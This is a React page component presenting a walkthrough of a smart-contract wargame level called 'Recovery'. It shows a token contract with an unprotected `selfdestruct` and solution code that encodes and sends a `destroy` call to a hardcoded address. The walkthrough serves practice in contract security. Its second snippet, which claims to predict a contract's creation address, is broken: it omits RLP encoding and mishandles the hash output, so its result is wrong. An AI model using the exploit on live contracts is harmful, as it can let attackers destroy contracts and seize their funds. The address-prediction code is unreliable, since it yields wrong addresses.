import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const Recovery = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  
  contract Recovery {
  
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
      new SimpleToken(_name, msg.sender, _initialSupply);
    
    }
  }
  
  contract SimpleToken {
  
    string public name;
    mapping (address => uint) public balances;
  
    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
      name = _name;
      balances[_creator] = _initialSupply;
    }
  
    // collect ether in return for tokens
    receive() external payable {
      balances[msg.sender] = msg.value * 10;
    }
  
    // allow transfers of tokens
    function transfer(address _to, uint _amount) public { 
      require(balances[msg.sender] >= _amount);
      balances[msg.sender] = balances[msg.sender] - _amount;
      balances[_to] = _amount;
    }
  
    // clean up after ourselves
    function destroy(address payable _to) public {
      selfdestruct(_to);
    }
  }`;

  const solutionCode = `
const functionSignature = {
    name: 'destroy',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_to'
        }
    ]
}

const params = [player]

const data = web3.eth.abi.encodeFunctionCall(functionSignature, params)

await web3.eth.sendTransaction({from: player, to: "0x6c53aa374eccb1ca985cdf8bf2de04acc6885746", data})


///////////////////////////////////////////////////////////////////////////////////

const keccak256 = require('js-sha3').keccak256;

const creatorAddress = '0x1234567890123456789012345678901234567890';
const creatorNonce = 1; // replace with the next nonce for the creator address

const addressBuffer = Buffer.from(creatorAddress.replace(/^0x/, ''), 'hex');
const nonceBuffer = Buffer.from(creatorNonce.toString(16), 'hex');

const concatenatedBuffer = Buffer.concat([addressBuffer, nonceBuffer]);
const hashedBuffer = keccak256(concatenatedBuffer);

const newAddress = '0x' + hashedBuffer.slice(-20).toString('hex');
console.log(newAddress); // outputs the upcoming address of the smart contract
`;

  return (
    <div>
      <h1 className="headerText">Recovery</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="There are two ways for passing this lvl, first is just find level instance address in etherscan, and in internal txns windows find last creation contract, and 
          it is our SimpleToken address, after that we can call self destruct and pass the level, another way to find SimpleToken address is nature of create opcode, we can predict created contract address."
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default Recovery;
